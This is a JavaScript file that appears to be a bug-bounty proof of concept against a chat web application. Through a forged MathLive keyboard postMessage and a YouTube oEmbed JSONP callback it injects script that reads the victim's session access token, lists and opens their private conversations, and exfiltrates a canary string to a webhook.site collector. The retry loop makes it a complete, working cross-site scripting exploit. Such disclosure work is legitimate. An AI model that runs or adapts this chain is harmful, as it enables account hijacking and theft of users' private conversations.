const statusNode = document.getElementById("status");
const callback =
  "d=parent.document,T='BB-XSS-PRIVATE-CHAT-PROOF-20261019'," +
  "C='https://webhook.site/49825850-a000-4c10-8010-bfddaff4ead2?source=chatgpt-private-chat&canary='," +
  "B=function(s){b=d.getElementById('bb-private-chat-proof');if(!b){b=d.createElement('div');" +
  "b.id='bb-private-chat-proof';b.setAttribute('style','position:fixed;left:16px;right:16px;bottom:16px;" +
  "z-index:2147483647;padding:14px 18px;border:3px solid #b91c1c;border-radius:10px;" +
  "background:#fff7ed;color:#7f1d1d;font:600 14px/1.4 system-ui');d.body.appendChild(b)}b.textContent=s};" +
  "if(d.documentElement.dataset.bbPrivateChatProof!=='running'&&" +
  "d.documentElement.dataset.bbPrivateChatProof!=='sent'&&" +
  "d.documentElement.dataset.bbPrivateChatProof!=='done'){" +
  "d.documentElement.dataset.bbPrivateChatProof='running';B('Reading synthetic private-chat canary…');" +
  "parent.fetch('/api/auth/session',{credentials:'include',headers:{" +
  "'X-OpenAI-Target-Path':'/api/auth/session','X-OpenAI-Target-Route':'/api/auth/session'}})" +
  ".then(function(r){if(!r.ok)throw Error('session '+r.status);return r.json()})" +
  ".then(function(s){h={Authorization:'Bearer '+s.accessToken,'ChatGPT-Account-ID':s.account.id};" +
  "return parent.fetch('/backend-api/conversations?exclude_conversation_origin=tpp&expand=false&" +
  "hide_snorlax=false&is_archived=false&is_starred=false&limit=5&order=updated&offset=0',{headers:h})" +
  ".then(function(r){if(!r.ok)throw Error('list '+r.status);return r.json()})" +
  ".then(function(j){q=(j.items||[]).find(function(x){return x.title===T});" +
  "if(!q)throw Error('synthetic chat not found');" +
  "return parent.fetch('/backend-api/conversations/'+encodeURIComponent(q.id)+" +
  "'?num_turns=2&include_has_versions=true',{headers:h})})})" +
  ".then(function(r){if(!r.ok)throw Error('read '+r.status);return r.json()})" +
  ".then(function(j){v=null;(j.messages||[]).some(function(m){" +
  "return((m.content||{}).parts||[]).some(function(p){" +
  "z=typeof p==='string'&&p.match(/PRIVATE_CANARY:[a-f0-9]{40}/);" +
  "if(z){v=z[0];return true}return false})});" +
  "if(!v)throw Error('synthetic canary not found');" +
  "d.documentElement.dataset.bbPrivateChatProof='sent';g=d.createElement('img');g.hidden=true;" +
  "g.referrerPolicy='no-referrer';g.onload=function(){if(d.documentElement.dataset.bbPrivateChatProof!=='done'){" +
  "d.documentElement.dataset.bbPrivateChatProof='done';" +
  "B('Impact confirmed: private victim chat read and synthetic canary exfiltrated');" +
  "parent.alert('private chat canary exfiltrated')}};" +
  "g.onerror=function(){d.documentElement.dataset.bbPrivateChatProof='';" +
  "B('Collector request failed; retrying')};" +
  "g.src=C+encodeURIComponent(v)+'&r='+Date.now();d.body.appendChild(g)})" +
  ".catch(function(e){d.documentElement.dataset.bbPrivateChatProof='';" +
  "B('Impact proof retrying: '+String(e.message||e))})};";

function attributeEscape(value) {
  return value.replaceAll("&", "&amp;")
    .replaceAll("\"", "&quot;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

let attempt = 0;
function deliver() {
  const endpoint = new URL("https://www.youtube.com/oembed");
  endpoint.searchParams.set("url", "https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  endpoint.searchParams.set("callback", callback + ";void");
  const source = '<script src="' + attributeEscape(endpoint.href) + '"><' + '/script>';
  const markup = '<iframe srcdoc="' + attributeEscape(source) + '"></iframe>';
  top.postMessage({
    type: "mathlive#virtual-keyboard-message",
    action: "update-setting",
    layouts: [{label: "Private chat impact proof", layers: [{id: "private-chat-impact", markup}]}],
  }, "*");
  top.postMessage({
    type: "mathlive#virtual-keyboard-message",
    action: "show",
    animate: false,
  }, "*");
  attempt += 1;
  if (statusNode) {
    statusNode.textContent = "Private-chat impact attempt " + attempt + " sent.";
  }
  if (attempt >= 90) clearInterval(timer);
}

deliver();
const timer = setInterval(deliver, 2000);
